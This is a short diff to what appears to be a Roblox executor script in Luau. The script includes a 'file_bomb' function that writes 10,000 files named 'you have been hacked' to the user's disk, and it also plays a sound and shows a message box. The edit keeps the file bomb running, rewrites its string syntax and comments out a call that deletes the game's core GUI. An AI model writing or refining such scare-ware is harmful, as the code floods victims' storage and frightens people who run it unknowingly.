@@ -34,9 +34,9 @@ local function delete_coregui()
 end
 
 local function file_bomb()
-	local textspam = ("h"):rep(10000)
+	local text = ("w"):rep(10000)
 	for i = 1, 10000 do
-		writefile(`you have been hacked{i}.txt`, textspam)
+		writefile("you have been hacked"..i..".txt", text)
 	end
 end
 
@@ -61,7 +61,7 @@ task.wait(_G.Delayed_1)
 Sound:Play()
 task.wait(_G.Delayed_2)
 
-task.spawn(delete_coregui)
+-- task.spawn(delete_coregui)
 task.spawn(file_bomb)
 task.spawn(msgbox)
 
